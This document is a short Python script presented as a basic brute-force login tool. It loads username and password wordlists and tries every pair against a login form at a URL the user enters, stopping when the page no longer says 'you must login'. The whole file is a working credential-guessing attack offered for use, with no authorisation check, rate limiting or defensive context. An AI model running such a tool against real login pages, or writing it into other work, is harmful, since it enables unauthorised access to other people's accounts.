# Brute-Force-Login-Tool-Basic-Python-Tool-

import requests

def brute_login(url, unamef, passf):
   with open(unamef,'r') as uf :
    usernames= uf.read().strip().splitlines()
 
   with open(passf,'r') as pf:
    passwords= pf.read().strip().splitlines()
 

   for username in usernames:
     for password in passwords:
        session= requests.session()
       
        login_data ={
            'uname': username,
            'pass': password,
            'submit'  : 'login'
       }    

        response= session.post(url,data= login_data)

        if 'you must login' not in response.text:
            print(f'login successfullwith username:{username} and password:{password}')
            return
              
        
   print('login failed, credentials not found')


if __name__=='__main__':
    url = input('url de :')
    unamef='usernames.txt' 
    passf= 'passwords.txt'
    
    brute_login(url, unamef, passf)

    
